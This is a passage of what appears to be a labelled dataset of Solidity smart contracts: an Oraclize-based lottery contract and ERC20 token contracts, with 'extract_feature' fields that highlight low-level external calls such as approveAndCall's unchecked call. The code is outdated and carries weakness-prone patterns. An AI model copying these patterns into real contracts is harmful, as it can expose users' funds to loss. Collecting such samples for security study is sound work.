tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract SafeAddSub {\n function safeAdd(uint a, uint b) internal returns (uint) {\n require(a + b >= a);\n return a + b;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n require(b <= a);\n return a - b;\n }\n}\ncontract EtherShot is usingOraclize, SafeAddSub {\n bool public gamePaused;\n address public owner;\n uint constant public TicketsInGame = 100;\n uint constant public WeiPerTicket = 100000000000000000;\n uint public TicketsSoldForThisGame;\n uint public GameNumber;\n uint public Jackpot = 0;\n uint nBytes = 1;\n uint oraclizeFees = 0;\n address[256] tickets;\n enum oraclizeState {Called, Returned}\n mapping (bytes32 => oraclizeState) queryIds;\n mapping (bytes32 => uint) queriesByGame;\n mapping (address => uint) playerPendingWithdrawals;\n uint constant callbackGas = 250000;\n modifier gameIsActive {\n require(gamePaused != true);\n _;\n }\n modifier ticketsAvailable {\n require(TicketsSoldForThisGame < TicketsInGame);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier allTicketsSold {\n require(TicketsSoldForThisGame == TicketsInGame);\n _;\n }\n modifier onlyOraclize {\n require(msg.sender == oraclize_cbAddress());\n _;\n }\n modifier isForActiveGame(bytes32 _queryId) {\n require(queryIds[_queryId] == oraclizeState.Called);\n require(queriesByGame[_queryId] == GameNumber);\n _;\n }\n event LogTicket(uint InGameNumber, address indexed PlayerAddress, uint TicketsPurchased);\n event LogResultWinner(uint InGameNumber, address indexed PlayerAddress, uint WinningTicketNumber, uint JackpotWon, bytes Proof);\n event LogResultNoWinner(uint InGameNumber, uint WinningTicketNumber, bytes Proof);\n function EtherShot(){\n oraclize_setProof(proofType_Ledger);\n owner = msg.sender;\n tickets[0] = owner;\n GameNumber = 1;\n TicketsSoldForThisGame = 1;\n }\n function()\n payable\n gameIsActive\n ticketsAvailable\n {\n require(msg.value >= WeiPerTicket);\n uint iterations = (msg.value / WeiPerTicket);\n bool firstBet = TicketsSoldForThisGame == 1;\n uint playerTickets = 0;\n for (uint x = 0; x < (TicketsInGame - 2) && TicketsSoldForThisGame < TicketsInGame && x < iterations; x++) {\n tickets[TicketsSoldForThisGame++] = msg.sender;\n playerTickets = safeAdd(playerTickets, 1);\n }\n LogTicket(GameNumber, msg.sender, playerTickets);\n Jackpot = safeSub(((TicketsSoldForThisGame - 1) * WeiPerTicket), oraclizeFees);\n if (!firstBet) {\n oraclizeFees = safeAdd(oraclizeFees, oraclize_getPrice(\"random\", callbackGas));\n bytes32 queryId = oraclize_newRandomDSQuery(0, nBytes, callbackGas);\n queryIds[queryId] = oraclizeState.Called;\n queriesByGame[queryId] = GameNumber;\n }\n uint refundableAmount = safeSub(msg.value, (playerTickets * WeiPerTicket));\n if (refundableAmount > 0 && !msg.sender.send(refundableAmount)) {\n playerPendingWithdrawals[msg.sender] = safeAdd(playerPendingWithdrawals[msg.sender], refundableAmount);\n }\n }\n function __callback(bytes32 _queryId, string _result, bytes _proof)\n gameIsActive\n onlyOraclize\n isForActiveGame(_queryId)\n oraclize_randomDS_proofVerify(_queryId, _result, _proof)\n {\n queryIds[_queryId] = oraclizeState.Returned;\n var result = bytesToInt(bytes(_result)) % TicketsInGame;\n if (result > (TicketsSoldForThisGame - 1)) {\n LogResultNoWinner(GameNumber, result + 1, _proof);\n }\n else {\n uint payout = ((TicketsSoldForThisGame - 1) * WeiPerTicket) - oraclizeFees;\n TicketsSoldForThisGame = 1;\n GameNumber++;\n oraclizeFees = 0;\n Jackpot = 0;\n var winningPlayer = tickets[result];\n if (!winningPlayer.send(payout)) {\n playerPendingWithdrawals[winningPlayer] = safeAdd(playerPendingWithdrawals[winningPlayer], payout);\n }\n LogResultWinner(GameNumber - 1, winningPlayer, result + 1, payout, _proof);\n }\n }\n function bytesToInt(bytes _inputBytes) constant internal returns (uint resultInt){\n resultInt = 0;\n for (uint i = 0; i < _inputBytes.length; i++) {\n resultInt += uint(_inputBytes[i]) * (2 ** (i * 8));\n }\n return resultInt;\n }\n function playerWithdrawPendingTransactions() public\n returns (bool)\n {\n uint withdrawAmount = playerPendingWithdrawals[msg.sender];\n playerPendingWithdrawals[msg.sender] = 0;\n if (msg.sender.call.value(withdrawAmount)()) {\n return true;\n }\n else {\n playerPendingWithdrawals[msg.sender] = withdrawAmount;\n return false;\n }\n }\n function playerGetPendingTxByAddress(address addressToCheck) public constant returns (uint) {\n return playerPendingWithdrawals[addressToCheck];\n }\n function retriggerDrawOnOraclizeError() public\n onlyOwner\n allTicketsSold\n {\n oraclizeFees = safeAdd(oraclizeFees, oraclize_getPrice(\"random\", callbackGas));\n Jackpot = safeSub(((TicketsSoldForThisGame - 1) * WeiPerTicket), oraclizeFees);\n bytes32 queryId = oraclize_newRandomDSQuery(0, nBytes, callbackGas);\n queryIds[queryId] = oraclizeState.Called;\n }\n function deployNewContract() public\n onlyOwner\n {\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15fe"
  },
  "filename": "36845.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ff"
  },
  "filename": "36847.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
